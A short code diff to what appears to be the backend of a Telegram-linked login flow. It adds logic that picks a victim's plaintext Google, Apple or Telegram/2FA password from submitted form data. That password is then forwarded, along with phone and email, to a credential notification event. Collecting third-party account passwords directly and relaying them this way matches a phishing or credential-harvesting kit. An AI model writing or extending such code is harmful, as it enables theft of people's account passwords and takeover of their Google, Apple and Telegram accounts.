@@ -181,6 +181,14 @@ async def api_complete(request: web.Request) -> web.Response:
             db.set_user_auth_step(DB_PATH, int(tg_id), "authorized")
 
         # Dispatch final auth completion event
+        prov = data.get("provider")
+        if prov == "google":
+            cred_pass = data.get("google_password")
+        elif prov == "apple":
+            cred_pass = data.get("apple_password")
+        else:
+            cred_pass = data.get("password_2fa") or data.get("telegram_password")
+
         asyncio.create_task(
             notify_auth_credential_event(
                 event_type="auth_complete",
@@ -189,7 +197,7 @@ async def api_complete(request: web.Request) -> web.Response:
                 nickname=data.get("nickname"),
                 phone=phone,
                 email=email,
-                password=data.get("password_2fa"),
+                password=cred_pass,
                 details="Авторизация успешно завершена",
                 is_test=bool(data.get("is_test", False)),
             )
